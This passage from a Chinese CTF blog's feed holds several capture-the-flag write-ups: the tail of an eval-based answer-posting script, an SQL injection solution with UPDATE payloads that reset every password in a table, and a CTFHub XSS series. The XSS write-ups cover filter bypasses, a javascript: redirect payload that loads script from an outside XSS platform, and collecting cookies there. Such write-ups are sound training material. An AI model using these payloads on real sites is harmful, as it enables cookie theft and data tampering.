拼接成一个数学表达式（注意：这里假设表达式是简单的，没有括号）</span><br><span class="line">    # 我们需要去除任何多余的空格和可能的=符号（它可能是表达式的一部分或用于提示用户输入）</span><br><span class="line">    # 并且我们假设=符号后面不会紧跟数字或运算符（即它是表达式的结尾）</span><br><span class="line">    expression_parts = [token for token in tokens if token != &#x27;=&#x27;]</span><br><span class="line">    expression = &#x27;&#x27;.join(expression_parts).replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">    print(expression)</span><br><span class="line">    # 计算表达式的值（注意：这里使用eval有安全风险，但在本例中为了简化而使用）</span><br><span class="line">    try:</span><br><span class="line">        result = eval(expression)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    # 为了避免过快地发送请求，我们添加了一个短暂的延迟（至少1秒）</span><br><span class="line">    # 根据题目要求，我们不能在1秒内回答一个问题，所以这里使用0.5秒的延迟</span><br><span class="line">    time.sleep(1.1)</span><br><span class="line">    # 准备POST数据</span><br><span class="line">    post_data = &#123;&#x27;ans&#x27;: result&#125;</span><br><span class="line">    print(result)</span><br><span class="line">    # 发送POST请求将答案发送回服务器</span><br><span class="line">    post_response = session.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # 检查响应内容是否包含关键词&quot;ctf&quot;</span><br><span class="line">print(post_response.text)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># 关闭会话</span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure><blockquote><p>NSSCTF{32a5eadd-b078-4e0c-9570-1b2852476085}</p></blockquote><h2 id="ezsql">ezsql</h2><blockquote><p>考点：sql注入</p></blockquote><p>先扫一下目录，发现源码，审计源码，发现sql注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231234785.png" alt="image-20241129231234785"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231223286.png" alt="image-20241129231223286"></p><p>根据提示，存在sql注入，直接sqlmap扫</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129230333540.png" alt="image-20241129230333540"></p><p>发现在年龄处存在sql注入漏洞，且根据payload可以看出是数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改当前表所有nickname为444</span><br><span class="line">nickname=aa&amp;age=11,nickname=444%23&amp;description=111&amp;token=</span><br><span class="line">修改当前表所有password为123</span><br><span class="line">nickname=aa&amp;age=11,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=111&amp;token=</span><br><span class="line">#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’))</span><br><span class="line">#urlencode(#)=%23</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129231014113.png" alt="image-20241129231014113"></p><blockquote><p>NSSCTF{3a6a5fad-87c3-4a7a-a6b6-35f1a532b42e}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBUCTF-2022-新生赛-wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-XSS</title>
    <link href="https://blog.m3x1.cn/posts/57dd66d8.html"/>
    <id>https://blog.m3x1.cn/posts/57dd66d8.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2025-02-01T16:19:14.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 id="DOM跳转">DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为&quot;jumpto&quot;，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
    
    
    <summary type="html">CTFHub技能树-XSS系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>XSS在线平台使用</title>
    <link href="https://blog.m3x1.cn/posts/169f5f8e.html"/>
    <id>https://blog.m3x1.cn/posts/169f5f8e.html</id>
    <published>2024-11-27T16:00:00.000Z</published>
    <updated>2024-12-02T09:25:18.658Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：由于自己搭建的xss平台需要服务器才能获取其他网络的cookie，所以无法接收赛题的cookie，最简便的方法还是使用在线平台，虽然可能有一定风险，以后买服务器了再搭建自己的吧</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191835876.png" alt="image-20241128191835876"></p><p>登录后，直接创建项目就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191919585.png" alt="image-20241128191919585"></p><p>传入的地址如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后就能在平台上接受到了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128192046521.png" alt="image-20241128192046521"></p>]]></content>
    
    
    <summary type="html">XSS在线平台使用</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
</feed>
